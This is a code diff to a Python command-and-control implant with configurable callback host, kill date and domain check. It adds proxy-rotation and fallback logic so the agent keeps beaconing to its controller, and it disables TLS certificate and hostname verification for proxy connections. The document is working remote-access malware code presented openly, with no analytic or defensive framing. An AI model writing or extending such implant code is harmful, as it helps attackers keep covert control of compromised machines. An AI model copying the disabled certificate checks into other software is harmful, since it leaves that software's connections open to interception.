@@ -383,6 +383,7 @@ CRYPTO_HERE
             return True
         else: return False
 
+
     def makeRequest(self, data, method='GET'):
         hdrs = {}
         for header in self.agent_config["Headers"]:
@@ -391,29 +392,153 @@ CRYPTO_HERE
             req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetParam"] + "=" + data.decode(), None, hdrs)
         else:
             req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["PostURI"], data, hdrs)
-        #CERTSKIP
-        if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
-            tls = "https" if self.agent_config["ProxyHost"][0:5] == "https" else "http"
-            handler = urllib.request.HTTPSHandler if tls else urllib.request.HTTPHandler
-            if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
-                proxy = urllib.request.ProxyHandler({
-                    "{}".format(tls): '{}://{}:{}@{}:{}'.format(tls, self.agent_config["ProxyUser"], self.agent_config["ProxyPass"], \
-                        self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
-                })
-                auth = urllib.request.HTTPBasicAuthHandler()
-                opener = urllib.request.build_opener(proxy, auth, handler)
+        
+        # Check if proxy is configured and get proxy URLs list
+        proxy_urls = []
+        if "ProxyHosts" in self.agent_config and self.agent_config["ProxyHosts"]:
+            proxy_urls = self.agent_config["ProxyHosts"]
+        elif self.agent_config.get("ProxyHost"):
+            # Fallback to single ProxyHost for compatibility
+            if "ProxyPorts" in self.agent_config and self.agent_config["ProxyPorts"]:
+                proxy_ports = self.agent_config["ProxyPorts"]
+            elif "ProxyPort" in self.agent_config and self.agent_config["ProxyPort"]:
+                proxy_ports = [self.agent_config["ProxyPort"]]
             else:
-                proxy = urllib.request.ProxyHandler({
-                    "{}".format(tls): '{}://{}:{}'.format(tls, self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
-                })
-                opener = urllib.request.build_opener(proxy, handler)
-            urllib.request.install_opener(opener)
-        try:
-            with urllib.request.urlopen(req) as response:
-                out = base64.b64decode(response.read())
-                response.close()
-                return out
-        except: return ""
+                proxy_ports = []
+            
+            # Convert old format to new format
+            for port in proxy_ports:
+                tls = "https" if self.agent_config["ProxyHost"].startswith("https") else "http"
+                proxy_host = self.agent_config["ProxyHost"].replace("https://", "").replace("http://", "")
+                proxy_urls.append(f"{tls}://{proxy_host}:{port}")
+        
+        # Prioritize connection methods based on last successful method
+        prioritized_methods = []
+        
+        if self.last_successful_method:
+            if self.last_successful_method == "direct":
+                # Direct connection worked last time, try it first
+                prioritized_methods.append("direct")
+                # Then try proxy URLs
+                if proxy_urls:
+                    prioritized_methods.extend([("proxy", url) for url in proxy_urls])
+            elif isinstance(self.last_successful_method, tuple) and self.last_successful_method[0] == "proxy":
+                # A specific proxy URL worked last time, try it first
+                last_successful_url = self.last_successful_method[1]
+                if last_successful_url in proxy_urls:
+                    prioritized_methods.append(("proxy", last_successful_url))
+                    # Then try other proxy URLs
+                    other_urls = [url for url in proxy_urls if url != last_successful_url]
+                    prioritized_methods.extend([("proxy", url) for url in other_urls])
+                else:
+                    # Last successful URL is no longer in config, try all proxy URLs
+                    prioritized_methods.extend([("proxy", url) for url in proxy_urls])
+                # Finally try direct connection
+                prioritized_methods.append("direct")
+        else:
+            # No previous success info, use default order: proxy URLs first, then direct
+            if proxy_urls:
+                prioritized_methods.extend([("proxy", url) for url in proxy_urls])
+            prioritized_methods.append("direct")
+        
+        # Helper function to record success
+        def record_success(method):
+            self.last_successful_method = method
+            if method not in self.connection_success_history:
+                self.connection_success_history[method] = 0
+            self.connection_success_history[method] += 1
+        
+        # Try connection methods in prioritized order
+        for conn_method in prioritized_methods:
+            if conn_method == "direct":
+                # Try direct connection
+                try:
+                    # Reset to no proxy for direct connection
+                    urllib.request.install_opener(urllib.request.build_opener())
+                    
+                    # Create a new request object for direct connection with correct target URL
+                    if method == 'GET':
+                        direct_url = self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetParam"] + "=" + data.decode()
+                        direct_req = urllib.request.Request(direct_url, None, hdrs)
+                    else:
+                        direct_url = self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["PostURI"]
+                        direct_req = urllib.request.Request(direct_url, data, hdrs)
+                    
+                    with urllib.request.urlopen(direct_req) as response:
+                        out = base64.b64decode(response.read())
+                        response.close()
+                        record_success("direct")
+                        return out
+                except Exception as e: 
+                    continue
+            
+            elif isinstance(conn_method, tuple) and conn_method[0] == "proxy":
+                # Try specific proxy URL
+                proxy_url = conn_method[1]
+                
+                if not proxy_urls:  # Skip if no proxy configured
+                    continue
+                
+                # Parse the proxy URL to extract components
+                try:
+                    from urllib.parse import urlparse
+                    parsed_proxy = urlparse(proxy_url)
+                    proxy_host = parsed_proxy.hostname
+                    proxy_port = parsed_proxy.port or (443 if parsed_proxy.scheme == "https" else 80)
+                    tls = parsed_proxy.scheme
+                except Exception as e:
+                    continue
+                
+                # Check if proxy host is resolvable (cache result per host)
+                proxy_host_key = f"_proxy_host_resolved_{proxy_host}"
+                if not hasattr(self, proxy_host_key):
+                    try:
+                        resolved_ip = socket.gethostbyname(proxy_host)
+                        setattr(self, proxy_host_key, True)
+                    except (socket.gaierror, Exception) as e:
+                        setattr(self, proxy_host_key, False)
+                
+                if not getattr(self, proxy_host_key):
+                    continue
+                
+                try:
+                    # Create SSL context that doesn't verify certificates for proxy connections
+                    import ssl
+                    ssl_context = ssl.create_default_context()
+                    ssl_context.check_hostname = False
+                    ssl_context.verify_mode = ssl.CERT_NONE
+                    
+                    # Create HTTPS handler with custom SSL context
+                    https_handler = urllib.request.HTTPSHandler(context=ssl_context)
+                    http_handler = urllib.request.HTTPHandler()
+                    
+                    if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
+                        auth_proxy_url = '{}://{}:{}@{}:{}'.format(tls, self.agent_config["ProxyUser"], self.agent_config["ProxyPass"], proxy_host, proxy_port)
+                        proxy = urllib.request.ProxyHandler({
+                            "http": auth_proxy_url,
+                            "https": auth_proxy_url
+                        })
+                        auth = urllib.request.HTTPBasicAuthHandler()
+                        opener = urllib.request.build_opener(proxy, auth, https_handler, http_handler)
+                    else:
+                        proxy = urllib.request.ProxyHandler({
+                            "http": proxy_url,
+                            "https": proxy_url
+                        })
+                        opener = urllib.request.build_opener(proxy, https_handler, http_handler)
+                    urllib.request.install_opener(opener)
+                    
+                    # Use the opener directly to ensure proxy is used
+                    with opener.open(req) as response:
+                        out = base64.b64decode(response.read())
+                        response.close()
+                        record_success(("proxy", proxy_url))
+                        return out
+                except Exception as e:
+                    continue
+        
+        # If we get here, all methods failed
+        return ""
 
     def passedKilldate(self):
         kd_list = [ int(x) for x in self.agent_config["KillDate"].split("-")]
@@ -439,6 +564,9 @@ CRYPTO_HERE
         self._meta_cache = {}
         self.moduleRepo = {}
         self.current_directory = os.getcwd()
+        # Track the last successful connection method for prioritization
+        self.last_successful_method = None  # Will be "direct" or ("proxy", proxy_url)
+        self.connection_success_history = {}  # Track success counts for each method
         self.agent_config = {
             "Server": "callback_host",
             "Port": "callback_port",
@@ -453,11 +581,11 @@ CRYPTO_HERE
             "ExchChk": "encrypted_exchange_check",
             "GetURI": "/get_uri",
             "GetParam": "query_path_name",
-            "ProxyHost": "proxy_host",
+            "ProxyHosts": PROXYHOSTS_HERE,
             "ProxyUser": "proxy_user",
             "ProxyPass": "proxy_pass",
             "ProxyPort": "proxy_port",
-            "DomainCheck": "#DOMAIN_CHECK_HERE",
+            "DomainCheck": "DOMAIN_CHECK_HERE",
         }
         if self.agent_config["DomainCheck"] != "":
             if not self.isJoinedToTheProvidedDomain():
